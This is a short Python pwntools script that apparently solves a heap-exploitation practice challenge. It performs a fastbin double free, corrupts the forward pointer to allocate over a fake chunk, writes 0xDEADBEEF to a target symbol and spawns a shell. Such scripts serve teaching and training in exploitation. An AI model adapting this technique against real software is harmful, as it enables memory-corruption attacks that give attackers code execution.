# fastbin_dup2.py
from pwn import *
p = process("./fastbin_dup2")


def add(data):
	print p.sendlineafter(">", "1")
	print p.sendlineafter(":", str(data))


def free(idx):
	print p.sendlineafter(">", "2")
	print p.sendlineafter(":", str(idx))


def getshell():
	print p.sendlineafter(">", "3")


elf = ELF('./fastbin_dup2')
fakechunk = p64(0)
fakechunk += p64(0x31)
print p.sendlineafter("Name :", fakechunk)
add("AAAA")  # 0
add("AAAA")  # 1
free(0)
free(1)
free(0)
overwrite_me_addr = elf.symbols['overwrite_me']
fake_chunk_name = elf.symbols['name']
add(p64(fake_chunk_name))  # 0x602010 : FD overwrite
add("AAAA")  # 0x602030
add("BBBB")  # 0x602010
add(p64(0xDEADBEEF))  # Arbitrary allocate, write
getshell()
p.interactive()
